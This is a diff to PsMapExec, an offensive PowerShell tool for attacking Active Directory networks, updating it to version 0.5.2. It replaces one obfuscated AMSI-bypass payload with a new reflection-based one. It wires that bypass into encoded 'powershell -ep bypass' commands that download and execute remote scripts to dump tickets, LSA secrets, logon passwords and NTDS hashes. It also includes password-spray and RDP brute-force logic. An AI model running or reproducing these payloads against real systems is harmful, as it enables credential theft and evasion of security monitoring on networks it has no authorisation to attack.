@@ -243,7 +243,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.5.1")
+Version : 0.5.2")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -376,6 +376,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
         return
     }
+
 
     if ($Targets -match "^\*.*|.*\*$") { Write-Host "Targets : Wildcard matching" }
     elseif ($Targets -eq "Workstations") { Write-Host "Targets : Workstations" }
@@ -891,6 +892,16 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     break
                 }
 
+                if ($AskPassword -like "*NOWN*") {
+                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "Principal not found"
+                    $InvalidCredentials = $true
+                    klist purge | Out-Null
+                    RestoreTicket
+                
+                    break
+                }
+
                 if ($AskPassword -like "*Unhandled rTickets exception:*") {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Incorrect password or username"
@@ -948,6 +959,16 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         break
                     }
 
+                    if ($AskRC4 -like "*NOWN*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Principal not found"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+
                     if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
@@ -999,6 +1020,16 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         klist purge | Out-Null
                         RestoreTicket
                     
+                        break
+                    }
+
+                    if ($Ask256 -like "*NOWN*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Principal not found"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
                         break
                     }
 
@@ -1065,6 +1096,16 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         klist purge | Out-Null
                         RestoreTicket
                     
+                        break
+                    }
+
+                    if ($AskRC4 -like "*NOWN*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Principal not found"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
                         break
                     }
                 
@@ -1422,14 +1463,14 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         )
 
         process {
-            $Computers = @()
+            $Computers = New-Object System.Collections.Generic.List[string]
             foreach ($subnet in $Targets) {
-                if ($subnet -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
-                    # Treat as a single IP address
+                if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
+                    # Treat as a single IP address - added robust regex to ensure valid ranges
                     $Computers += $subnet
                 }
-                elseif ($subnet -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$') {
-                    # CIDR notation processing
+                elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
+                    # CIDR notation processing - added robust regex to ensure valid ranges, accepts up to /16 but will notify user to reduce mask appropriately
                     $IP = ($subnet -split '\/')[0]
                     [int]$SubnetBits = ($subnet -split '\/')[1]
                     if ($SubnetBits -lt 20 -or $SubnetBits -gt 30) {
@@ -1446,7 +1487,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     $HostBits = 32 - $SubnetBits
                     $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)
                     $HostIDInBinary = '0' * $HostBits
-                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 2 # -2 to exclude network and broadcast addresses
+                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to ensure last useable IP in range is included but not the broadcast IP
                     For ($i = 1; $i -le $imax; $i++) {
                         $NextHostIDInDecimal = $i
                         $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
@@ -1459,13 +1500,21 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                             $IP += $IPOctetInDecimal
                         }
                         $IP = $IP -join '.'
-                        $Computers += $IP
+                        $Computers.Add($IP)
                     }
                 }
                 else {
                     Write-Error -Message "Input [$subnet] is not in a valid format"
                 }
             }
+            
+            try {
+            (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress | ForEach-Object {
+                    $Computers.Remove($_)
+                }
+            }
+            Catch {}
+
             return $Computers
         }
     }
@@ -1696,38 +1745,52 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         }
     }
 
-    if ($Method -eq "Spray") {
-    
-        Write-Verbose "Performing user LDAP queries for method (Spray)"
-        $searcher = New-Searcher
+if ($Method -eq "Spray") {
+    Write-Verbose "Performing user LDAP queries for method (Spray)"
+    $searcher = New-Searcher
+    if ($Targets -eq "AdminCount=1") {
+        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+    } else {
         $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
-        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
-        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+    }
+    $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+    $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+    $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
 
-        if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
-            $Targets = $EnabledDomainUsers
+    $fileUsersLoaded = $false
+
+    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users" -or $Targets -eq "AdminCount=1") {
+        $Targets = $EnabledDomainUsers
+    }
+    elseif (Test-Path $Targets -PathType Leaf) {
+        # If $Targets is a valid file path, read usernames from the file
+        $EnabledDomainUsers = Get-Content -Path $Targets
+        $fileUsersLoaded = $true
+    }
+    elseif ($Targets -in $EnabledDomainUsers) {
+        $EnabledDomainUsers = $Targets
+    }
+    
+    if (-not $fileUsersLoaded) {
+        $groupMembers = Get-GroupMembers -GroupName $Targets
+        if ($groupMembers.Count -gt 0) {
+            $EnabledDomainUsers = $groupMembers
         }
-        elseif ($Targets -in $EnabledDomainUsers) {
-            $EnabledDomainUsers = $Targets
+        elseif ($groupMembers.Count -eq 0) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Group either does not exist or is empty"
+            return
         }
         else {
-            $groupMembers = Get-GroupMembers -GroupName $Targets
-            if ($groupMembers.Count -gt 0) {
-                $EnabledDomainUsers = $groupMembers
-            }
-            elseif ($groupMembers.Count -eq 0) {
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "Group either does not exist or is empty"
-                return
-            }
-            else {
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "Unspecified Error"
-                return
-            }
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Unspecified Error"
+            return
         }
     }
+}
+
+
+
 
     if ($Method -eq "IPMI" -and $Option -eq "IPMI:DomainUsers") {
         Write-Verbose "Performing user LDAP queries for method (IPMI)"
@@ -1997,10 +2060,9 @@ g/FGwEikMF6QPjdo6gDZbW3wiW/Q1B3AfqAsylP8Gl11zGE1xGzWU+wWXWXNYTXFbNZT/BZddcjSe4Gj
 i5VQlvu4CNwSkfbXLVCvSPthGJkDy7QHNsRpC6H7zzU3LmbUi+wkgzcZUZL29/d5Tzgjg5Dqhv3H+v8A9eh9jGkfAAA=";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
 '@
 
-    # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/Invoke-NETMongoose.ps1
-    $Mongoose = @'
-Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
-$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
+$Arbiter = @'
+Function Invoke-GuiltySpark {$X="5492868772801748688168747280728187173688878280688776828";$Y="1173680867656877679866880867644817687416876797271";[Ref]."A`ss`Embly"."GET`TY`Pe"((0..37|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'').GetField((38..51|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'','NonPublic,Static').SetValue($null,$([Convert]::ToBoolean("True")))}
+Invoke-GuiltySpark
 '@
 
     ################################################################################################################
@@ -2009,7 +2071,7 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
 
     # Tickets
     if ($Module -eq "Tickets") {
-        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
+        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Arbiter | IEX}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
@@ -2059,28 +2121,28 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
 
     # LogonPasswords
     elseif ($Module -eq "LogonPasswords") {
-        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
+        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Arbiter | IEX}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
 
     # NTDS
     elseif ($Module -eq "NTDS") {
-        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
+        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Arbiter | IEX}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
 
     # eKeys
     elseif ($Module -eq "ekeys") {
-        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
+        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Arbiter | IEX}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
 
     # LSA
     elseif ($Module -eq "LSA") {
-        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
+        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Arbiter | IEX}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
@@ -2157,7 +2219,7 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
     ################################################################################################################
     ################################################ Function: WMI #################################################
     ################################################################################################################
-    Function Method-WMIexec {
+    Function Method-WMI {
         param ($ComputerName)
         Write-host
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -3299,52 +3361,38 @@ while (`$true) {
                 Start-Sleep -Milliseconds 100
             }
 
+            # Start the job
             $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP
             [array]$RDPJobs += $RDPJob
+        }
 
-            # Check if the maximum number of concurrent jobs has been reached
-            if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
-                do {
-                    # Wait for any job to complete
-                    $JobFinished = $null
-                    foreach ($Job in $RDPJobs) {
-                        if ($Job.State -eq 'Completed') {
-                            $JobFinished = $Job
-                            break
-                        }
-                    }
-
-                    if ($JobFinished) {
-                        # Retrieve the job result and remove it from the job list
-                        $Result = Receive-Job -Job $JobFinished
-                        # Process the result as needed
-                        $Result
-
-                        $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
-                        Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
+        # Monitor and manage jobs, terminate any that run longer than 120 seconds (Assume hung)
+        do {
+            foreach ($Job in $RDPJobs) {
+                if ($Job.State -eq 'Running') {
+                    $runtime = (Get-Date) - $Job.PSBeginTime
+                    if ($runtime.TotalSeconds -gt 120) {
+                        Stop-Job -Job $Job -Force
+                        Remove-Job -Job $Job -Force
+                        $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
                     }
                 }
-                until (-not $JobFinished)
+                elseif ($Job.State -eq 'Completed') {
+                    $Result = Receive-Job -Job $Job
+                    $Result
+                    Remove-Job -Job $Job -Force
+                    $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
+                }
             }
+            Start-Sleep -Milliseconds 100
+        } while ($RDPJobs.Count -gt 0)
+
+        # Final cleanup for any lingering jobs (should be none at this point)
+        $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue
+
+        if (Test-Path -Path "$RDP\$Username.txt") {
+            Get-Content -Path "$RDP\$Username.txt" | Select-Object -Unique | Set-Content -Path "$RDP\$Username.txt"
         }
-
-        # Wait for any remaining jobs to complete
-        $RDPJobs | ForEach-Object {
-            $JobFinished = $_ | Wait-Job -Timeout "15"
-
-            if ($JobFinished) {
-                # Retrieve the job result and remove it from the job list
-                $Result = Receive-Job -Job $JobFinished
-                # Process the result as needed
-                $Result
-
-                Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
-            }
-        }
-
-        # Clean up all remaining jobs
-        $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
-        if (Test-Path -Path "$RDP\$Username.txt") { Get-Content -Path "$RDP\$Username.txt" | Select-Object -Unique | Set-Content -Path "$RDP\$Username.txt" }
     }
 
     ################################################################################################################
@@ -5449,6 +5497,12 @@ public class Advapi32 {
                 $IPMIUsers = $EnabledDomainUsers
             } 
 
+            elseif ($Option -like "IPMI:*") {
+            
+                $IPMIUsers = $Option.Split(':')[1]
+            
+            }
+            
             else {
                 Write-Verbose "[IPMI] Using built in user list"
     
@@ -6110,6 +6164,7 @@ public class Advapi32 {
     ################################################################################################################
 
     function Parse-KerbDump {
+
         Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
         Start-sleep -Seconds "2"
 
@@ -6365,7 +6420,7 @@ public class Advapi32 {
         "WinRM" { Method-WinRM }
         "MSSQL" { Method-MSSQL }
         "SMB" { Method-SMB }
-        "WMI" { Method-WMIexec }
+        "WMI" { Method-WMI }
         "RDP" { Method-RDP }
         "GenRelayList" { GenRelayList }
         "SessionHunter" { Invoke-SessionHunter }
